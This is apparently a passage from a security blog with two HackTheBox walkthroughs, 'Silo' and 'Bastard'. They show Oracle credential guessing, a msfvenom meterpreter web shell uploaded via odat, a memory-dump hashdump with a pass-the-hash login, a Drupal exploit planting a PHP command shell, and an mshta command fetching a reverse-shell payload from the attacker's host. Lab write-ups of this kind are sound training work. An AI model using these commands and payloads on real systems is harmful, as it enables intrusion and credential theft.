(a/A) - continue without to ask (c/C) c [+] Valid credentials found: scott/tiger. Continue... ###################################################################################################################################################### | ETA: 00:00:45 100% |#####################################################################################################################################################################################################################| Time: 00:10:56 [+] Accounts found on 10.10.10.82:1521/XE: scott/tiger This time we found valid credentials: scott/tiger . Armed with these credentials we can now try to login to the db with sqlplus : ┌─[m4rc0@SittingDucks]─[~] └──╼ $sqlplus64 scott/tiger@10.10.10.82:1521/XE SQL*Plus: Release 19.0.0.0.0 - Production on Tue Apr 14 16:50:50 2020 Version 19.6.0.0.0 Copyright (c) 1982, 2019, Oracle. All rights reserved. ERROR: ORA-28002: the password will expire within 7 days Connected to: Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production SQL> select * from user_role_privs; USERNAME GRANTED_ROLE ADM DEF OS_ ------------------------------ ------------------------------ --- --- --- SCOTT CONNECT NO YES NO SCOTT RESOURCE NO YES NO SQL> As shown above, after connecting successfully I ran a select command to check the privileges and we can see scott does not have admin priveleges. Let's see if we are able to login as sysdba : luar@SittingDucks]─[~] └──╼ $sqlplus64 scott/tiger@10.10.10.82:1521/XE as sysdba SQL*Plus: Release 19.0.0.0.0 - Production on Tue Apr 14 16:54:43 2020 Version 19.6.0.0.0 Copyright (c) 1982, 2019, Oracle. All rights reserved. Connected to: Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production SQL> select * from user_role_privs; USERNAME GRANTED_ROLE ADM DEF OS_ ------------------------------ ------------------------------ --- --- --- SYS ADM_PARALLEL_EXECUTE_TASK YES YES NO SYS APEX_ADMINISTRATOR_ROLE YES YES NO SYS AQ_ADMINISTRATOR_ROLE YES YES NO SYS AQ_USER_ROLE YES YES NO SYS AUTHENTICATEDUSER YES YES NO SYS CONNECT YES YES NO SYS CTXAPP YES YES NO SYS DATAPUMP_EXP_FULL_DATABASE YES YES NO SYS DATAPUMP_IMP_FULL_DATABASE YES YES NO SYS DBA YES YES NO SYS DBFS_ROLE YES YES NO USERNAME GRANTED_ROLE ADM DEF OS_ ------------------------------ ------------------------------ --- --- --- SYS DELETE_CATALOG_ROLE YES YES NO SYS EXECUTE_CATALOG_ROLE YES YES NO SYS EXP_FULL_DATABASE YES YES NO SYS GATHER_SYSTEM_STATISTICS YES YES NO SYS HS_ADMIN_EXECUTE_ROLE YES YES NO SYS HS_ADMIN_ROLE YES YES NO SYS HS_ADMIN_SELECT_ROLE YES YES NO SYS IMP_FULL_DATABASE YES YES NO SYS LOGSTDBY_ADMINISTRATOR YES YES NO SYS OEM_ADVISOR YES YES NO SYS OEM_MONITOR YES YES NO USERNAME GRANTED_ROLE ADM DEF OS_ ------------------------------ ------------------------------ --- --- --- SYS PLUSTRACE YES YES NO SYS RECOVERY_CATALOG_OWNER YES YES NO SYS RESOURCE YES YES NO SYS SCHEDULER_ADMIN YES YES NO SYS SELECT_CATALOG_ROLE YES YES NO SYS XDBADMIN YES YES NO SYS XDB_SET_INVOKER YES YES NO SYS XDB_WEBSERVICES YES YES NO SYS XDB_WEBSERVICES_OVER_HTTP YES YES NO SYS XDB_WEBSERVICES_WITH_PUBLIC YES YES NO 32 rows selected. Indeed connecting as sysdba shows that scott has admin privileges and this will be very useful since it will allow us to perform a set of actions that will eventually give us what we want. One thing I like to do whenever possible is to create my own user and don't mess around with the current one. So I do that: SQL> create user m4rc0 identified by myp4ssw0rd; User created. SQL> grant dba to m4rc0; Grant succeeded. SQL> Now I need to find a way to get a shell. Looking within the options of odat there are two interesting ones: dbmsxslprocessor to upload files dbmsadvisor to upload files So we will try to use one of these to upload a webshell to the victing machine. To understand what could be a suitable shell I run the below curl command. ┌─[m4rc0@SittingDucks]─[~] └──╼ $curl -I 10.10.10.82 HTTP/1.1 200 OK Content-Length: 701 Content-Type: text/html Last-Modified: Wed, 03 Jan 2018 00:36:17 GMT Accept-Ranges: bytes ETag: \"1114bde2a84d31:0\" Server: Microsoft-IIS/8.5 X-Powered-By: ASP.NET Date: Tue, 14 Apr 2020 16:08:42 GMT This tells me that we are dealing with the ASP.NET framework and therefore I will create an aspx webshell and upload it to the victim box (I tried asp before aspx but didn't work) . To generate the payload I will use msfvenom : ┌─[✗]─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/silo] └──╼ $msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.14.6 LPORT=443 -f aspx -o shell.aspx [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder or badchars specified, outputting raw payload Payload size: 604 bytes Final size of aspx file: 4118 bytes Saved as: shell.aspx ┌─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/silo] └──╼ $ll total 8.0K -rw-r--r-- 1 m4rc0 m4rc0 4.1K Apr 14 22:51 shell.aspx and then I upload the file in the IIS root directory (default is C:\\inetput\\wwwroot ) ┌─[m4rc0@SittingDucks]─[~/Tools/odat] └──╼ $python3 odat.py dbmsxslprocessor -s 10.10.10.82 -U m4rc0 -P myp4ssw0rd -d XE --sysdba --putFile \"C:\\inetpub\\wwwroot\" \"shell.aspx\" \"/home/m4rc0/Documents/htb/boxes/silo/shell.aspx\" [1] (10.10.10.82:1521): Put the /home/m4rc0/Documents/htb/boxes/silo/shell.aspx local file in the C:\\inetpub\\wwwroot path (named shell.aspx) of the 10.10.10.82 server [+] The /home/m4rc0/Documents/htb/boxes/silo/shell.aspx local file was put in the remote C:\\inetpub\\wwwroot path (named shell.aspx) Once we have the file in that directory I start a meterpreter listenr and then I browse to the aspx payload to activate the shell: ┌─[✗]─[m4rc0@SittingDucks]─[~/Tools/odat] └──╼ $curl http://10.10.10.82/shell.aspx and we get the shell: msf5 > use exploit/multi/handler msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https payload => windows/x64/meterpreter/reverse_https msf5 exploit(multi/handler) > set LHOST 10.10.14.6 LHOST => 10.10.14.6 msf5 exploit(multi/handler) > set LPORT 443 LPORT => 443 msf5 exploit(multi/handler) > run [*] Started HTTPS reverse handler on https://10.10.14.6:443 [*] https://10.10.14.6:443 handling request from 10.10.10.82; (UUID: lwv93nms) Staging x64 payload (207449 bytes) ... [*] Meterpreter session 1 opened (10.10.14.6:443 -> 10.10.10.82:49166) at 2020-04-14 23:28:40 +0100 meterpreter >shell Process 1692 created. Channel 1 created. Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. c:\\windows\\system32\\inetsrv>whoami whoami iis apppool\\defaultapppool> then I moved to the Users directory and noticed the user Phineas and inside his desktop I found the user.txt : c:\\Users>dir dir Volume in drive C has no label. Volume Serial Number is 78D4-EA4D Directory of c:\\Users 01/04/2018 10:40 PM <DIR> . 01/04/2018 10:40 PM <DIR> .. 01/03/2018 02:03 AM <DIR> .NET v2.0 01/03/2018 02:03 AM <DIR> .NET v2.0 Classic 01/03/2018 10:23 PM <DIR> .NET v4.5 01/03/2018 10:23 PM <DIR> .NET v4.5 Classic 01/01/2018 01:49 AM <DIR> Administrator 01/03/2018 02:03 AM <DIR> Classic .NET AppPool 01/07/2018 03:04 PM <DIR> Phineas 08/22/2013 04:39 PM <DIR> Public 0 File(s) 0 bytes 10 Dir(s) 15,184,658,432 bytes free c:\\Users>cd phineas cd phineas c:\\Users\\Phineas>cd desktop cd desktop c:\\Users\\Phineas\\Desktop>dir dir Volume in drive C has no label. Volume Serial Number is 78D4-EA4D Directory of c:\\Users\\Phineas\\Desktop 01/07/2018 03:03 PM <DIR> . 01/07/2018 03:03 PM <DIR> .. 01/05/2018 11:56 PM 300 Oracle issue.txt 01/04/2018 10:41 PM 32 user.txt 2 File(s) 332 bytes 2 Dir(s) 15,184,654,336 bytes free c:\\Users\\Phineas\\Desktop>type user.txt type user.txt 92****************************17 c:\\Users\\Phineas\\Desktop> together with the user.txt file we can see another text file in the Desktop so I decided to have a look: c:\\Users\\Phineas\\Desktop>type \"Oracle issue.txt\" type \"Oracle issue.txt\" Support vendor engaged to troubleshoot Windows / Oracle performance issue (full memory dump requested): Dropbox link provided to vendor (and password under separate cover). Dropbox link https://www.dropbox.com/sh/69skryzfszb7elq/AADZnQEbbqDoIf5L2d0PBxENa?dl=0 link password: % Hm8646uC$ So we have a dropbox link and a password but if I try to download that file it fails stating that the password is incorrect. So I started thinking it was just a trick to make me waste time. However, I remembered that some unicode characters may behave funny over shells so I decided to double check by downloading the file on my box. ┌─[✗]─[m4rc0@SittingDucks]─[~/Tools/odat] └──╼ $python3 odat.py dbmsxslprocessor -s 10.10.10.82 -U m4rc0 -P myp4ssw0rd -d XE --sysdba --getFile \"c:\\Users\\Phineas\\Desktop\" \"Oracle issue.txt\" \"/home/m4rc0/Documents/htb/boxes/silo/OracleIssue.txt\" [1] (10.10.10.82:1521): Get the /home/m4rc0/Documents/htb/boxes/silo/OracleIssue.txt remote file from the c:\\Users\\Phineas\\Desktop path (named Oracle issue.txt) of the 10.10.10.82 server [+] The Oracle issue.txt remote file was downloaded in /home/m4rc0/Documents/htb/boxes/silo/OracleIssue.txt ┌─[m4rc0@SittingDucks]─[~/Tools/odat] └──╼ $cat /home/m4rc0/Documents/htb/boxes/silo/OracleIssue.txt Support vendor engaged to troubleshoot Windows / Oracle performance issue (full memory dump requested): Dropbox link provided to vendor (and password under separate cover). Dropbox link https://www.dropbox.com/sh/69skryzfszb7elq/AADZnQEbbqDoIf5L2d0PBxENa?dl=0 link password: �%Hm8646uC$ once downloaded the file I get the another character at the beginning, I try again but same result, password incorrect. Searching on google I found this on wikipedia: \"The replacement character (often a black diamond with a white question mark or an empty square box) is a symbol found in the Unicode standard at code point U+FFFD in the Specials table. It is used to indicate problems when a system is unable to render a stream of data to a correct symbol.\" So this confirms the thesis that there is a rendering problem with this specific character and I don't know how to fix this issue. I even dowloaded the file on another box and tried with several different text editors like notepad++, MS Word, Sublime text, but I was unable to get that character rendered properly. After doing some research I found someone online was able to get the real characher through a webshell. So I downloaded an aspx webshell, available here https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.aspx, and I uploaded it to the victim box using the same technique as before: ┌─[m4rc0@SittingDucks]─[~/Tools/odat] └──╼ $python3 odat.py dbmsxslprocessor -s 10.10.10.82 -U m4rc0 -P myp4ssw0rd -d XE --sysdba --putFile \"C:\\inetpub\\wwwroot\" \"webshell.aspx\" \"/home/m4rc0/Documents/htb/boxes/silo/webshell.aspx\" [1] (10.10.10.82:1521): Put the /home/m4rc0/Documents/htb/boxes/silo/webshell.aspx local file in the C:\\inetpub\\wwwroot path (named webshell.aspx) of the 10.10.10.82 server [+] The /home/m4rc0/Documents/htb/boxes/silo/webshell.aspx local file was put in the remote C:\\inetpub\\wwwroot path (named webshell.aspx) Then I browse the webpage: Now we can see a £ as the first character of the password: £%Hm8646uC$ . Now I was able to login successfully and dowload the file which seems to be a memory dump: Then I unzip the file and I scan the dump with volatility : ┌─[m4rc0@SittingDucks]─[~] └──╼ $volatility kdbgscan -f ~/Documents/htb/boxes/silo/SILO-20180105-221806.dmp <SNIP ><SNIP> ************************************************** ************************************************** Instantiating KDBG using: Unnamed AS Win2012R2x64_18340 (6.3.9601 64bit) Offset (V) : 0xf80078520a30 Offset (P) : 0x2320a30 KdCopyDataBlock (V) : 0xf8007845f9b0 Block encoded : Yes Wait never : 0xd08e8400bd4a143a Wait always : 0x17a949efd11db80 KDBG owner tag check : True Profile suggestion (KDBGHeader): Win2012R2x64_18340 Version64 : 0xf80078520d90 (Major: 15, Minor: 9600) Service Pack (CmNtCSDVersion) : 0 Build string (NtBuildLab) : 9600.16384.amd64fre.winblue_rtm. PsActiveProcessHead : 0xfffff80078537700 (51 processes) PsLoadedModuleList : 0xfffff800785519b0 (148 modules) KernelBase : 0xfffff8007828a000 (Matches MZ: True) Major (OptionalHeader) : 6 Minor (OptionalHeader) : 3 KPCR : 0xfffff8007857b000 (CPU 0) KPCR : 0xffffd000207e8000 (CPU 1) <SNIP ><SNIP> Since the output is very long I only pasted here a snippet. The bit I pasted is repeated several times but with different profiles. I only pasted the one that is relevant to the victim OS version I had found before: meterpreter > sysinfo Computer : SILO OS : Windows 2012 R2 (6.3 Build 9600). Architecture : x64 System Language : en_GB Domain : HTB Logged On Users : 0 Meterpreter : x64/windows So now I run volatility again using the Win 2012 profile: ┌─[m4rc0@SittingDucks]─[~] └──╼ $volatility -f ~/Documents/htb/boxes/silo/SILO-20180105-221806.dmp --profile Win2012R2x64 hivelist Volatility Foundation Volatility Framework 2.6 Virtual Physical Name ------------------ ------------------ ---- 0xffffc0000100a000 0x000000000d40e000 \\??\\C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat 0xffffc000011fb000 0x0000000034570000 \\SystemRoot\\System32\\config\\DRIVERS 0xffffc00001600000 0x000000003327b000 \\??\\C:\\Windows\\AppCompat\\Programs\\Amcache.hve 0xffffc0000001e000 0x0000000000b65000 [no name] 0xffffc00000028000 0x0000000000a70000 \\REGISTRY\\MACHINE\\SYSTEM 0xffffc00000052000 0x000000001a25b000 \\REGISTRY\\MACHINE\\HARDWARE 0xffffc000004de000 0x0000000024cf8000 \\Device\\HarddiskVolume1\\Boot\\BCD 0xffffc00000103000 0x000000003205d000 \\SystemRoot\\System32\\Config\\SOFTWARE 0xffffc00002c43000 0x0000000028ecb000 \\SystemRoot\\System32\\Config\\DEFAULT 0xffffc000061a3000 0x0000000027532000 \\SystemRoot\\System32\\Config\\SECURITY 0xffffc00000619000 0x0000000026cc5000 \\SystemRoot\\System32\\Config\\SAM 0xffffc0000060d000 0x0000000026c93000 \\??\\C:\\Windows\\ServiceProfiles\\NetworkService\\NTUSER.DAT 0xffffc000006cf000 0x000000002688f000 \\SystemRoot\\System32\\Config\\BBI 0xffffc000007e7000 0x00000000259a8000 \\??\\C:\\Windows\\ServiceProfiles\\LocalService\\NTUSER.DAT 0xffffc00000fed000 0x000000000d67f000 \\??\\C:\\Users\\Administrator\\ntuser.dat Volatility has many useful options . In this scenario I used hivelist to get a list of the registry hives in the memory dump. Once we have the hives, we can try to retrieve the administrator password hash. For this we can use the hashdump fuction of volatility . The help menu of volatility hashdump shows this: -y SYS_OFFSET, --sys-offset=SYS_OFFSET SYSTEM hive offset (virtual) -s SAM_OFFSET, --sam-offset=SAM_OFFSET SAM hive offset (virtual) So since we have the SYS and SAM offsets from the previous command we can now try to fetch the administrator hash: ┌─[m4rc0@SittingDucks]─[~] └──╼ $volatility -f ~/Documents/htb/boxes/silo/SILO-20180105-221806.dmp --profile Win2012R2x64 hashdump -y 0xffffc00000028000 -s 0xffffc00000619000 Volatility Foundation Volatility Framework 2.6 Administrator:500:aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Phineas:1002:aad3b435b51404eeaad3b435b51404ee:8eacdd67b77749e65d3b3d5c110b0969::: Now I can use a python script, psexec.py to perform a pass-the-hash attack. ┌─[m4rc0@SittingDucks]─[~/Tools/impacket/examples] └──╼ $./psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 -target-ip 10.10.10.82 administrator@10.10.10.82 Impacket v0.9.22.dev1+20200327.103853.7e505892 - Copyright 2020 SecureAuth Corporation [*] Requesting shares on 10.10.10.82..... [*] Found writable share ADMIN$ [*] Uploading file OuXukLXP.exe [*] Opening SVCManager on 10.10.10.82..... [*] Creating service kdqo on 10.10.10.82..... [*] Starting service kdqo..... [!] Press help for extra shell commands Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C:\\Windows\\system32>whoami nt authority\\system Finally, I have full provileges and can read the root.txt . C:\\Windows\\system32>type c:\\users\\administrator\\desktop\\root.txt cd****************************f6 PS: I could have easily downloaded or read directly the user.txt and root.txt using odat since we had privileges to do that. However, I used the long way for learning purposes and I have to say it was a nice box with few difficulties. I struggled quite a lot on the special character thing, but in the end is a lesson learned.","tags":"blogging","loc":"https://sittingducks.io/Silo.html","title":"Silo"},{"url":"https://sittingducks.io/Bastard.html","text":"Initial Nmap ┌─[m4rc0@SittingDucks]─[~/Documents/htb] └──╼ $nmap -sV -sC -p- 10.10.10.9 Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 22:04 BST Nmap scan report for 10.10.10.9 Host is up (0.097s latency). Not shown: 65532 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5 |_http-generator: Drupal 7 (http://drupal.org) | http-methods: |_ Potentially risky methods: TRACE | http-robots.txt: 36 disallowed entries (15 shown) | /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt |_http-server-header: Microsoft-IIS/7.5 |_http-title: Welcome to 10.10.10.9 | 10.10.10.9 135/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 321.27 seconds From the nmap output we understand there is an IIS web server v7.5 running on port 80. Therefore we can deduct we are dealing with a Windows machine. A quick search on Wikipedia tells us that IIS 7.5 IIS 7.5 was included in Windows 7 and Windows Server 2008 R2, so we are potentially deailng with one of these versions. Nmap also reveals that Drupal 7 (a popular cms) is running on IIS. Browing the websites gives this result: I also check the robots.txt file at http://10.10.10.9/robots.txt which pointed me to look at the http://10.10.10.9/CHANGELOG.txt which confirmed Drupal version is 7.54: Drupal 7.54, 2017-02-01 ----------------------- - Modules are now able to define theme engines (API addition: https://www.drupal.org/node/2826480). - Logging of searches can now be disabled (new option in the administrative interface). - Added menu tree render structure to (pre-)process hooks for theme_menu_tree() (API addition: https://www.drupal.org/node/2827134). - Added new function for determining whether an HTTPS request is being served (API addition: https://www.drupal.org/node/2824590). - Fixed incorrect default value for short and medium date formats on the date type configuration page. - File validation error message is now removed after subsequent upload of valid file. - Numerous bug fixes. - Numerous API documentation improvements. - Additional performance improvements. - Additional automated test coverage. Before doing any kind of manual scanning it's always best practice to look for known exaploits which can save us precious time. Looking for Drupal exploits with searchsploit cli we have this: ┌─[m4rc0@SittingDucks]─[~/Documents/htb] └──╼ $searchsploit drupal 7 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------- Exploit Title | Path | (/usr/share/exploitdb/) -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------- Drupal 4.7 - 'Attachment mod_mime' Remote Command Execution | exploits/php/webapps/1821.php Drupal 4.x - URL-Encoded Input HTML Injection | exploits/php/webapps/27020.txt Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User) | exploits/php/webapps/34992.py Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Admin Session) | exploits/php/webapps/44355.php Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (1) | exploits/php/webapps/34984.py Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (2) | exploits/php/webapps/34993.php Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Execution) | exploits/php/webapps/35150.php Drupal 7.12 - Multiple Vulnerabilities | exploits/php/webapps/18564.txt Drupal 7.x Module Services - Remote Code Execution | exploits/php/webapps/41564.php Drupal < 4.7.6 - Post Comments Remote Command Execution | exploits/php/webapps/3313.pl Drupal < 5.22/6.16 - Multiple Vulnerabilities | exploits/php/webapps/33706.txt Drupal < 7.34 - Denial of Service | exploits/php/dos/35415.txt Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit) | exploits/php/webapps/44557.rb Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC) | exploits/php/webapps/44542.txt Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution | exploits/php/webapps/44449.rb Drupal Module CKEditor < 4.1WYSIWYG (Drupal 6.x/7.x) - Persistent Cross-Site Scripting | exploits/php/webapps/25493.txt Drupal Module Coder < 7.x-1.3/7.x-2.6 - Remote Code Execution | exploits/php/remote/40144.php Drupal Module Cumulus 5.x-1.1/6.x-1.4 - 'tagcloud' Cross-Site Scripting | exploits/php/webapps/35397.txt Drupal Module Drag & Drop Gallery 6.x-1.5 - 'upload.php' Arbitrary File Upload | exploits/php/webapps/37453.php Drupal Module Embedded Media Field/Media 6.x : Video Flotsam/Media: Audio Flotsam - Multiple Vulnerabilities | exploits/php/webapps/35072.txt Drupal Module RESTWS 7.x - PHP Remote Code Execution (Metasploit) | exploits/php/remote/40130.rb Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Disclosure | exploits/php/webapps/44501.txt -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------- Shellcodes: No Result i think \"Drupal 7.x Module Services - Remote Code Execution --> exploits/php/webapps/41564.php\" is the intended exploit simply because it was available when the box was released in 2017 whereas the other relevant exploits were not. Looking at the code of the exploit I can see there is a quick summary of what it does: Use the SQL Injection to get the contents of the cache for current endpoint along with admin credentials and hash Alter the cache to allow us to write a file and do so Restore the cache There are also some details we have to feed in the script: $url = 'http://vmweb.lan/drupal-7.54'; $endpoint_path = '/rest_endpoint'; $endpoint = 'rest_endpoint'; $file = [ 'filename' => 'dixuSOspsOUU.php', 'data' => ' <?php eval ( file_get_contents ( \\ 'php://input\\')); ?>' ]; We know the URL but we need to find the rest endpoint and its path. Being lost for a little while I decided to go ahead with my usual next enumeration step, that is directory scanning. Using gobuster I scan until I found /rest (it took ages): ┌─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/bastard] └──╼ $gobuster dir --url http://10.10.10.9 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.10.9 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/04/08 19:19:33 Starting gobuster =============================================================== /search (Status: 403) /misc (Status: 301) /themes (Status: 301) /0 (Status: 200) /user (Status: 200) /modules (Status: 301) /admin (Status: 403) /scripts (Status: 301) /node (Status: 200) /tag (Status: 403) /Search (Status: 403) /sites (Status: 301) /template (Status: 403) /includes (Status: 301) /profiles (Status: 301) /rest (Status: 200) <SNIP> <SNIP> <SNIP> and when I browsed to that file I see this: ┌─[✗]─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/bastard] └──╼ $curl http://10.10.10.9/rest Services Endpoint \"rest_endpoint\" has been setup successfully. So it looks like we found the rest endpoint name and path so we will replace the details of the script as below: $url = 'http://10.10.10.9'; $endpoint_path = '/rest'; $endpoint = 'rest_endpoint'; $file = [ 'filename' => '41564.php', 'data' => ' <?php system ( $_REQUEST [ \"cmd\" ]); ?> ' I executed the script but I got an error which after some research I found I had to install php-curl . Another error was related to the fact that a comment at line 15 and another at line 70 of the script had wrapped onto the next line. I fixed both issues and ran the script again: ┌─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/bastard] └──╼ $php 41564.php # Exploit Title: Drupal 7 .x Services Module Remote Code Execution # Vendor Homepage: https://www.drupal.org/project/services # Exploit Author: Charles FOL # Contact: https://twitter.com/ambionics # Website: https://www.ambionics.io/blog/drupal-services-module-rce # !/usr/bin/php Stored session information in session.json Stored user information in user.json Cache contains 7 entries File written: http://10.10.10.9/41564.php So if the script did its job I should have remote execution through the piece of code we added to the script, that is <?php system($_REQUEST[\"cmd\"]); ?> . Indeed, I am able to run commands in the victim box, such as whoami : ┌─[✗]─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/bastard] └──╼ $curl http://10.10.10.9/41564.php?cmd=whoami nt authority\\iusr or systeminfo ┌─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/bastard] └──╼ $curl http://10.10.10.9/41564.php?cmd=systeminfo Host Name: BASTARD OS Name: Microsoft Windows Server 2008 R2 Datacenter OS Version: 6.1.7600 N/A Build 7600 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Server OS Build Type: Multiprocessor Free Registered Owner: Windows User Registered Organization: Product ID: 00496-001-0001283-84782 Original Install Date: 18/3/2017, 7:04:46 System Boot Time: 7/4/2020, 11:30:09 System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: x64-based PC Processor(s): 2 Processor(s) Installed. [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz BIOS Version: Phoenix Technologies LTD 6.00, 12/12/2018 Windows Directory: C:\\Windows System Directory: C:\\Windows\\system32 Boot Device: \\Device\\HarddiskVolume1 System Locale: el;Greek Input Locale: en-us;English (United States) Time Zone: (UTC+02:00) Athens, Bucharest, Istanbul Total Physical Memory: 2.047 MB Available Physical Memory: 1.525 MB Virtual Memory: Max Size: 4.095 MB Virtual Memory: Available: 3.551 MB Virtual Memory: In Use: 544 MB Page File Location(s): C:\\pagefile.sys Domain: HTB Logon Server: N/A Hotfix(s): N/A Network Card(s): 1 NIC(s) Installed. [01]: Intel(R) PRO/1000 MT Network Connection Connection Name: Local Area Connection DHCP Enabled: No IP address(es) [01]: 10.10.10.9 At this point, I want to get a full shell on my box so I use a Living Off The Land tactic, that is mshta . To do this I download a python script called weirdhta . ┌─[m4rc0@SittingDucks]─[~/Tools/weirdhta] └──╼ $./weirdhta.py █ █░▓█████ ██▓ ██▀███ ▓█████▄ ██░ ██ ▄▄▄█████▓ ▄▄▄ ▓█░ █ ░█░▓█ ▀ ▓██▒▓██ ▒ ██▒▒██▀ ██▌ ▓██░ ██▒▓ ██▒ ▓▒▒████▄ ▒█░ █ ░█ ▒███ ▒██▒▓██ ░▄█ ▒░██ █▌ ▒██▀▀██░▒ ▓██░ ▒░▒██ ▀█▄ ░█░ █ ░█ ▒▓█ ▄ ░██░▒██▀▀█▄ ░▓█▄ ▌ ░▓█ ░██ ░ ▓██▓ ░ ░██▄▄▄▄██ ░░██▒██▓ ░▒████▒░██░░██▓ ▒██▒░▒████▓ ░▓█▒░██▓ ▒██▒ ░ ▓█ ▓██▒ ░ ▓░▒ ▒ ░░ ▒░ ░░▓ ░ ▒▓ ░▒▓░ ▒▒▓ ▒ ▒ ░░▒░▒ ▒ ░░ ▒▒ ▓▒█░ ▒ ░ ░ ░ ░ ░ ▒ ░ ░▒ ░ ▒░ ░ ▒ ▒ ▒ ░▒░ ░ ░ ▒ ▒▒ ░ ░ ░ ░ ▒ ░ ░░ ░ ░ ░ ░ ░ ░░ ░ ░ ░ ▒ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ by felamos 1) Powershell Reverse Shell. 2) Custom Command. > 1 [*] Enter IP Address: 10.10.14.61 [*] Enter PORT: 443 [*] Written test.hta Once I run the tool it asks for an IP and a port. I provide the IP of my attacking machine and port 443. This will create a payload, test.hta, which if executed on the victim machine would give us a shell back on my ParrotOS box. So I start a simple python http server in the directory where the test.hta file is located: ┌─[m4rc0@SittingDucks]─[~/Tools/weirdhta] └──╼ $sudo python -m SimpleHTTPServer [sudo] password for m4rc0: Serving HTTP on 0.0.0.0 port 8000 ... then I start a netcat listener on port 443 and I launch the following command: ┌─[✗]─[m4rc0@SittingDucks]─[~/Tools/weirdhta] └──╼ $curl http://10.10.10.9/41564.php?cmd='C%3A%2FWindows%2FSystem32%2Fmshta.exe+http%3A%2F%2F10.10.14.61%3A8000%2Ftest.hta' -v * Trying 10.10.10.9:80... * TCP_NODELAY set * Connected to 10.10.10.9 (10.10.10.9) port 80 (#0) > GET /41564.php?cmd = C%3A%2FWindows%2FSystem32%2Fmshta.exe+http%3A%2F%2F10.10.14.61%3A8000%2Ftest.hta HTTP/1.1 > Host: 10 .10.10.9 > User-Agent: curl/7.68.0 > Accept: */* > * Mark bundle as not supporting multiuse < HTTP/1.1 200 OK < Content-Type: text/html < Server: Microsoft-IIS/7.5 < X-Powered-By: PHP/5.3.28 < X-Powered-By: ASP.NET < Date: Thu, 09 Apr 2020 05:27:41 GMT < Content-Length: 0 < * Connection #0 to host 10.10.10.9 left intact where the C%3A%2FWindows%2FSystem32%2Fmshta.exe+http%3A%2F%2F10.10.14.61%3A8000%2Ftest.hta is the URL encoded part for C:\\Windows\\System32\\mshta.exe http://10.10.14.61:8000/test.hta . The netcat listener I had started shows I got a shell successfully: ┌─[✗]─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/bastard] └──╼ $sudo nc -lvnp 443 [sudo] password for m4rc0: listening on [any] 443 ... connect to [10.10.14.61] from (UNKNOWN) [10.10.10.9] 49484 Client Connected... PS C:\\inetpub\\drupal-7.54> Looking around I see there is a user folder called dimitris and i found the user.txt in the Desktop: PS C:\\Users\\dimitris\\Desktop> cat user.txt ba****************************a2 Now we need to find be able to read the root.txt which requires us to be Administrator. From the systeminfo command I had previously ran I see that the OS version is 6.1.7600 N/A Build 7600 which is exactly the same version of another box I had recently exploited, that is Devel . Furthemore, the systeminfo suggests that the Windows machine does not have any hotfixes installed. For this Windows version we can use exploit 40564 from exploitdb. So I repeat the same procedure with the only difference that this time the target system is a x64 bit architecture. Because of this instead of running i686-w64-mingw32-gcc I run x86_64-w64-mingw32-gcc to compile the \"C\" program. 